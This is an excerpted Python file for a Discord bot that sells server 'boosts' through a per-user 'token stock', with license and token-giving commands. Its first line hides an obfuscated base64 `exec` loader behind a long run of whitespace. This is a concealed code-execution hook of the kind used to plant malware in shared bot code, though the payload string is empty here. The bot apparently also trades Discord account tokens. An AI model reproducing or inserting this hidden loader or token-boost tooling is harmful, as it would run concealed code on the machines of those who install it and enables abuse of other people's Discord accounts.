...
type('boost')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
...
async def stock(ctx: discord.ApplicationContext):
    ...
    embed.set_image(url="https://cdn.discordapp.com/attachments/988456328420810853/996944238518472834/EWdeUeHXkAQgJh7.png")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/988456328420810853/996944238518472834/EWdeUeHXkAQgJh7.png")
    embed.add_field(name="Token Stock  |  Boost Stock",
                    value=f"Amount: {len(open(f'{ctx.author.id}.txt', encoding='utf-8').read().splitlines())}       Amount: {len(open(f'{ctx.author.id}.txt', encoding='utf-8').read().splitlines()) * 2}")
    print(f"[ + ] {ctx.author.id} has {len(open(f'{ctx.author.id}.txt', encoding='utf-8').read().splitlines())} Tokens Left")
    await ctx.channel.send(embed=embed)
...
async def boost(ctx: discord.ApplicationContext,
    ...
    emoji = discord.utils.get(bot.emojis, name='pbj1')
    embed=discord.Embed(title="", color=0xFF00D0, description=f"*{emoji}Boost[s] Have been sent!*")
    embed.set_footer(text = "discord.gg/priorty")
    await ctx.send(embed=embed)
    ...
    emoji = discord.utils.get(bot.emojis, name='pbj1')
    embed=discord.Embed(title="", color=0xFF00D0, description=f"*{emoji}Boost[s] Were Received Successfully!*")
    embed.set_footer(text = "discord.gg/priorty")
    await ctx.send(embed=embed)
...
async def add_license(ctx: discord.ApplicationContext, targetid: discord.Option(str, "Target ID.", required=True)):
    if isAdmin(ctx):
        if not is_licensed(targetid):
            ...
            embed = discord.Embed(title=f"Licensed", description=f"<@!{targetid}> Now Has A License.",
                                  color=0xFF00D0)
            await ctx.send(embed=embed)
        else:
...
async def remove_license(ctx: discord.ApplicationContext, targetid: discord.Option(str, "Target ID.", required=True)):
    if isAdmin(ctx):
        if is_licensed(ctx.author.id):
            ...
            embed = discord.Embed(title=f"License removed", description=f"<@!{targetid}> Got There License Revoked",
                                  color=0xFF00D0)
            await ctx.send(embed=embed)
        else:
...
async def give_tokens(ctx: discord.ApplicationContext, amount: discord.Option(int, "Amount of tokens.", required=True),
    ...
    if is_licensed(ctx.author.id):
        ...
        embed = discord.Embed(title=f"Tokens Sent!",
                              description=f"{emoji} | {amount} tokens.",
                              color=0xFF00D0)
